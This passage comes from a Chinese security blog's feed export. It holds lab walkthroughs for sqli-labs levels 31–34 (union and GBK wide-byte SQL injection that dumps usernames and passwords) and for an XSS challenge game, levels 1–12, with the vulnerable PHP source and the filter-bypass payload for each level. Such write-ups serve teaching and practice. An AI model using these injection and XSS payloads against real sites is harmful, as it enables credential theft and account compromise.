class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>同29，只是改变为括号加双引号</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;) union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><h2 id="less-32-宽字节注入"><a href="#less-32-宽字节注入" class="headerlink" title="less-32(宽字节注入)"></a>less-32(宽字节注入)</h2><p>转义函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes()，mysql_real_escape_string()，mysql_escape_string()</span><br></pre></td></tr></table></figure><p>特殊字符前面被加上了<code>\</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hint: The Query String you input is escaped as : 1\&apos;--</span><br><span class="line">The Query String you input in Hex becomes : 315c272d2d20</span><br></pre></td></tr></table></figure><h3 id="how-to-solve"><a href="#how-to-solve" class="headerlink" title="how to solve \"></a>how to solve \</h3><p>而网站在过滤<code>&#39;</code>的时候，通常的思路就是将<code>&#39;</code>转换为<code>\&#39;</code>,因此我们在此想办法将<code>&#39;</code>前面添加的<code>\</code>去掉，一般有两种思路：</p><ol><li><p>第一种方法：程序的默认字符集是<code>GBK</code>等宽字节字符集，则可以发生GBK宽字节注入，url编码<code>\&#39;</code>为<code>%5c%27</code>，mysql使用GBK编码时，会默认两个字符为一个汉字，<code>%bb%5c</code>是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），所以<code>%bb%5c%27</code>转化过来就是<code>汉字&#39;</code>，此时便可以直接闭合引号；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%bb%27union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure></li><li><p>第二种方法：构造<code>id=%bb\\&#39;</code>，转义后为<code>%bb%5c\\\\&#39;</code>，其中<code>%bb%5c</code>为汉字，其余的四个<code>\</code>转义为两个<code>\</code>，那么单引号正好没有被转义</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%bb\\%27union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure></li></ol><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>这个只是调用了系统的转义函数<code>addslashes($string)</code>，注入方法和32一致</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%bb%27union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;利用Sqli-labs帮助理解sql注入的相关知识~
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Sql注入" scheme="https://gardenia30.top/tags/Sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>XSS小游戏通关笔记</title>
    <link href="https://gardenia30.top/2019/04/03/XSS%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/04/03/XSS小游戏通关笔记/</id>
    <published>2019-04-03T03:21:16.000Z</published>
    <updated>2019-04-09T09:29:15.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>XSS-初体验~<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>第一关非常基础，黑盒下传参name构造<code>?name=&lt;script&gt;alert(&#39;hacker&#39;);&lt;/script&gt;</code>即可弹窗，属于反射性XSS；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看源码发现没有过滤…</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>第二关也没有什么难度，黑盒下在输入框中测试test，查看页面的html发现<code>&lt;input name=keyword  value=&quot;test&quot;&gt;</code>直接闭合双引号和input标签，构造<code>?keyword=&quot;&gt;&lt;script&gt;alert(&#39;hacker&#39;);&lt;/script&gt;</code>即可弹窗；同样是属于反射型XSS；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure><p>查看源码，果然…</p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><p>界面和第二关差不多，黑盒下测试输入test2333，查看页面html发现<code>&lt;input name=keyword  value=&#39;test2333&#39;&gt;</code>，发现是单引号闭合，尝试闭合引号和标签：</p><p><code>?keyword=&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code>，却发现：</p><p><code>&lt;input name=keyword  value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;xss&#39;);&amp;lt;/script&amp;gt;&#39;&gt;</code></p><p>看样子是设置了特殊字符转码，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>果然是添加了<code>htmlspecialchars()</code>函数进行了过滤，所以这里不能再用闭合标签的方法来构造弹窗了，采取闭合value引号，<strong>添加html事件属性</strong>的方法来构造弹窗：</p><p>payload：<code>&#39; onkeypress=&#39;alert(&quot;hacker&quot;)</code>，在输入框中敲击键盘即可弹窗；</p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>和level-3几乎一样，测试发现输出点，<code>&lt;input name=keyword  value=&quot;test2333&quot;&gt;</code></p><p>发现这次是双引号，直接闭合，构造html事件属性造成弹窗即可；</p><p>payload：<code>?keyword=&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></p><p>level-3和4这里需要注意的是闭合的到底是双引号还是单引号，里面的alert引号也需要随之变化，不能使用同样的引号，否则会达不到效果；</p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><p>上来还是像上面一样尝试闭合引号，添加一个html事件属性，但是这次已经不起作用，查看html发现：</p><p><a href="https://imgchr.com/i/Ar6FM9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/31/Ar6FM9.png" alt="Ar6FM9.png"></a></p><p>事件属性貌似也被过滤了……这好像就触及到我的知识盲点了，google一波发现可以使用html链接，所以直接闭合引号和标签，再写入一个html链接，链接效果为弹窗即可：</p><p>payload：<code>&quot;&gt; &lt;a href=&quot;javascript:alert(&#39;hacker&#39;)&quot;&gt;click me&lt;/a&gt; //</code></p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现果然是不能使用<code>&lt;script&gt;</code>标签和事件属性，全部都被替换掉了……</p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><p>直接查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>链接属性也别过滤掉了…心碎…</p><p>但是仔细对比一下就可以发现，这一关没有进行小写转换，<code>$str = strtolower($_GET[&quot;keyword&quot;]);</code>这是极其重要的，因为html对大小写是不敏感的，即使是大写也可以正常运行，所以直接可以用大写绕过…</p><p>payload:<code>&quot;&gt; &lt;a Href=&quot;javascript:alert(&#39;hacker&#39;)&quot;&gt;click me&lt;/a&gt;</code></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相信打过ctf的人都知道<code>str_replace()</code>这个函数在代码审计里的漏洞，替换为空时可以直接双写绕过</p><p>payload：<code>&quot;&gt; &lt;a hrhrefef=&quot;javascscriptript:alert(&#39;hacker&#39;)&quot;&gt;click me&lt;/a&gt; //</code></p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><p>这一关貌似和前面的都不太一样，回显有两个输出的地方，发现第二个输出是：把你输入的内容当做一个链接内容放在href属性里面，所以这一关应该就是构造一个可以绕过script字符串替换的字符，</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现这里双引号都被过滤掉了，那肯定是不可以闭合标签了，问题就是链接里的<code>javascript:alert(&#39;hacker&#39;)</code></p><p>script会被替换，要想办法绕过即可，既然是链接，直接unicode编码即可：</p><p>payload:<code>java&amp;#115;cript:alert(1)</code></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h2><p>这一关有点奇怪，直接查看源码吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现相比上一关，多了一个if判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br></pre></td></tr></table></figure><p>也就是说我们构造的字符串里必须要含有<code>http://</code>这样的字符，结合上一关，需要在字符中添加<code>http://</code>的字符，并且还不能让其起作用…直接注释掉即可：</p><p>payload:<code>java&amp;#115;cript:alert(1)//http://</code></p><h2 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现GET了两个值，分别是<code>keyword</code>和<code>t_sort</code>；</p><p><code>keyword</code>不多说，GG……输出点只有一个，而且被过滤了…</p><p>另一个切入点就是t_sort参数，查看代码发现是滤掉了<code>&lt;和&gt;</code>，那标签一类的就不可以使用了，输出点属性hidden，所以看不见；</p><p>这里我们使用另一种绕过方法，先闭合value的引号，然后添加html事件属性，随后设置type为text(对同一属性赋不同的值时，浏览器解析时只会解析第一次出现的属性)；</p><p>payload:<code>?keyword=test&amp;t_sort=&quot; onkeypress=&quot;alert(&#39;hacker&#39;)&quot; type=&quot;text&quot;&gt;</code></p><h2 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h2><p>查看源代码发现又多了一个参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那这一关肯定又是在t_ref上做文章…先看看它的值是什么：<code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code>发现是上一个跳转页面的url，而且过滤掉了<code>&lt; &gt;</code>，其实也好办…和上一个是一个套路，就是直接闭合引号，然后添加事件属性构造弹窗，接着覆盖type即可，只不过这一步需要从上一个页面用bp抓包去修改参数…</p><p>上一个页面即将跳转时抓包：</p><p><a href="https://imgchr.com/i/AyFOWn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/01/AyFOWn.md.png" alt="AyFOWn.md.png"></a></p><p>修改Referer请求头，forward一下，即可构成弹窗事件；：</p><p><img src="https://s2.ax1x.com/2019/04/01/AykQFH.png" alt="AykQFH.png"></p><p>payload:<code>Referer: &quot; onkeypress=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;</code></p><h2 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span 